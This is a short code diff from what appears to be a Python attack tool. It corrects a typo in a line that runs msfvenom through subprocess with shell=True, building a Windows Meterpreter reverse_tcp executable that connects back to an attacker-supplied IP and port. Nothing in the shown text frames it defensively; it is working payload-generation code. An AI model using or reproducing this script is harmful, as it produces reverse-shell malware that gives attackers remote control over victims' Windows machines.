@@ -103,7 +103,7 @@ if os == "":
 #subprocess.Popen(payload, shell=True).wait()
 #print("[*] Exported payload successfully.")
 
-ayload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)
+payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)
 print("[*] Exporting payload, please be patient as: " + filename)
 subprocess.Popen(payload, shell=True).wait()
 print("[*] Exported payload successfully.")
